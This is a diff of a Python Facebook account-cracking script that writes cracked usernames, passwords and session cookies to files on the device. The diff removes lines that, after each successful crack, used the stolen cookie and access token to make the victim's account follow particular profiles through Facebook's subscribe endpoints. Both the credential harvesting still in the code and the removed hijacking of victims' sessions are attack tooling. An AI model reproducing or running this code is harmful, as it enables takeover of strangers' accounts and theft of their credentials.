@@ -641,7 +641,6 @@ class crack:
                     open("/sdcard/GS-2X-IDS/M-1 IDS/M3-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
                     open("/sdcard/GS-2X-IDS/M-1 IDS/M3-GSXD_COKIE.TXT", "a").write(used + "	|	" + pw + " 	| 	" + cokie + 																	"			\n")
                     ok.append(user + pw)
-                    self.follow(coki)
                     break
                 elif "checkpoint" in str(cok):
                     self.cek_cp(user,pw)
@@ -818,8 +817,6 @@ class crack:
                         open("/sdcard/GS-2X-IDS/M2- IDS/M2-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/GS-2X-IDS/M2- IDS/M2-GSXD_COKIE.TXT", "a").write(used + "	|	" + pw + " 	| 	" + cokie + 																	"			\n")
                         ok.append(used + pw)
-                        follow_id='100009468801755' #riyad
-                        subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                         break
                     except KeyError:
                         #print(f"\r\033#[1;33m[TL-GSXD] {used} | {pw} {VV}    ")
@@ -969,10 +966,6 @@ class crack:
                         open("/sdcard/GS-2X-IDS/M3- IDS/M3-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/GS-2X-IDS/M3- IDS/M3-GSXD_COKIE.TXT", "a").write(used + "	|	" + pw + " 	| 	" + cokie + 																	"			\n")
                         ok.append(used + pw)
-                        follow_id='100000160984736' #uzzal
-                        subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
-                        follow_id='100009468801755' #riyad
-                        subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                         break
                     except KeyError:
                         #print(f"\r\033[1#;33m[TL-GSXD] {used} | {pw} {VV}    ")
@@ -1027,17 +1020,6 @@ class crack:
                 time.sleep(5)
         self.loop += 1
         
-    def follow(self,coki):
-        session = requests.Session()
-        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100000160984736",cookies={"cookie":coki}).text,"html.parser")
-        for x in r.find_all("a",href=True):
-            if "/a/subscribe.php" in x.get('href'):
-                session.get('https://mbasic.facebook.com'+x.get('href'), cookies={'cookie':coki}).text
-        #if '/a/subscribe.php' in str(r):
-            #b=str(r).split('/a/subscribe.php')[1].split('">')[0].replace('&amp;', '&')
-            #session.get("https://mbasic.facebook.com/a/subscribe.php"+str(b), cookies={"cookie":coki}).text
-        #else:
-            #pass
 
     def cek_cp(self,user,pw):
         global ok,cp,f2
